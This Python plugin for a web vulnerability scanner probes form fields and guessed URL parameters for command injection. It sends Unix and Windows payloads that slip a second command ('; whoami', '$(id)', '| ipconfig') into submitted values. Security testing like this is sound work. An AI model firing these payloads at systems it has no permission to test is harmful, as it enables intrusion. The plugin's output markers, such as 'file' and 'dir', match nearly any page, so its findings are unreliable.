def scan(scanner):
    """Scan for Command Injection vulnerabilities"""
    print("[PLUGIN] Scanning for Command Injection vulnerabilities...")
    
    # Command injection payloads
    cmd_payloads = [
        '; ls',
        '| ls',
        '& ls',
        '&& ls',
        '|| ls',
        '`ls`',
        '$(ls)',
        '; whoami',
        '| whoami',
        '& whoami',
        '&& whoami',
        '|| whoami',
        '`whoami`',
        '$(whoami)',
        '; id',
        '| id',
        '& id',
        '&& id',
        '|| id',
        '`id`',
        '$(id)',
        '; pwd',
        '| pwd',
        '& pwd',
        '&& pwd',
        '|| pwd',
        '`pwd`',
        '$(pwd)'
    ]
    
    # Windows command injection payloads
    win_cmd_payloads = [
        '& dir',
        '&& dir',
        '|| dir',
        '; dir',
        '| dir',
        '`dir`',
        '$(dir)',
        '& whoami',
        '&& whoami',
        '|| whoami',
        '; whoami',
        '| whoami',
        '`whoami`',
        '$(whoami)',
        '& ipconfig',
        '&& ipconfig',
        '|| ipconfig',
        '; ipconfig',
        '| ipconfig',
        '`ipconfig`',
        '$(ipconfig)'
    ]
    
    try:
        response = scanner.session.get(scanner.target_url, timeout=scanner.timeout)
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(response.content, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            form_action = form.get('action', '')
            form_method = form.get('method', 'get').lower()
            
            if form_action:
                test_url = scanner.urljoin(scanner.target_url, form_action)
            else:
                test_url = scanner.target_url
            
            inputs = form.find_all('input')
            for input_field in inputs:
                input_name = input_field.get('name')
                input_type = input_field.get('type', 'text')
                
                if input_name and input_type in ['text', 'hidden', 'file']:
                    # Test Linux/Unix command injection
                    for payload in cmd_payloads:
                        if form_method == 'post':
                            data = {input_name: payload}
                            try:
                                response = scanner.session.post(test_url, data=data, timeout=scanner.timeout)
                            except:
                                continue
                        else:
                            test_url_with_payload = f"{test_url}?{input_name}={scanner.urllib.parse.quote(payload)}"
                            try:
                                response = scanner.session.get(test_url_with_payload, timeout=scanner.timeout)
                            except:
                                continue
                        
                        # Check for command execution indicators
                        cmd_indicators = [
                            'bin', 'usr', 'etc', 'var', 'home', 'root', 'proc',
                            'total', 'drwx', 'rwx', 'ls:', 'pwd:', 'whoami:',
                            'uid=', 'gid=', 'groups=', 'directory', 'file'
                        ]
                        
                        response_text = response.text.lower()
                        for indicator in cmd_indicators:
                            if indicator in response_text:
                                scanner.log_vulnerability(
                                    'Command Injection',
                                    'Critical',
                                    f'Command injection vulnerability detected in parameter {input_name}',
                                    f'Payload: {payload}, Indicator: {indicator}',
                                    'CWE-78'
                                )
                                break
                    
                    # Test Windows command injection
                    for payload in win_cmd_payloads:
                        if form_method == 'post':
                            data = {input_name: payload}
                            try:
                                response = scanner.session.post(test_url, data=data, timeout=scanner.timeout)
                            except:
                                continue
                        else:
                            test_url_with_payload = f"{test_url}?{input_name}={scanner.urllib.parse.quote(payload)}"
                            try:
                                response = scanner.session.get(test_url_with_payload, timeout=scanner.timeout)
                            except:
                                continue
                        
                        # Check for Windows command execution indicators
                        win_indicators = [
                            'volume', 'directory of', 'bytes free', 'dir',
                            'windows', 'system32', 'program files', 'users',
                            'ipconfig', 'ethernet adapter', 'wireless lan adapter'
                        ]
                        
                        response_text = response.text.lower()
                        for indicator in win_indicators:
                            if indicator in response_text:
                                scanner.log_vulnerability(
                                    'Command Injection (Windows)',
                                    'Critical',
                                    f'Windows command injection vulnerability detected in parameter {input_name}',
                                    f'Payload: {payload}, Indicator: {indicator}',
                                    'CWE-78'
                                )
                                break
        
        # Test URL parameters for command injection
        test_params = ['cmd', 'command', 'exec', 'execute', 'system', 'shell', 'ping', 'nslookup']
        
        for param in test_params:
            for payload in cmd_payloads:
                test_url = f"{scanner.target_url}?{param}={scanner.urllib.parse.quote(payload)}"
                try:
                    response = scanner.session.get(test_url, timeout=scanner.timeout)
                    
                    # Check for command execution indicators
                    cmd_indicators = [
                        'bin', 'usr', 'etc', 'var', 'home', 'root', 'proc',
                        'total', 'drwx', 'rwx', 'ls:', 'pwd:', 'whoami:',
                        'uid=', 'gid=', 'groups=', 'directory', 'file'
                    ]
                    
                    response_text = response.text.lower()
                    for indicator in cmd_indicators:
                        if indicator in response_text:
                            scanner.log_vulnerability(
                                'Command Injection',
                                'Critical',
                                f'Command injection vulnerability detected in URL parameter {param}',
                                f'Payload: {payload}, Indicator: {indicator}',
                                'CWE-78'
                            )
                            break
                except:
                    continue
                    
    except Exception as e:
        print(f"[PLUGIN][Command Injection] Error: {e}") 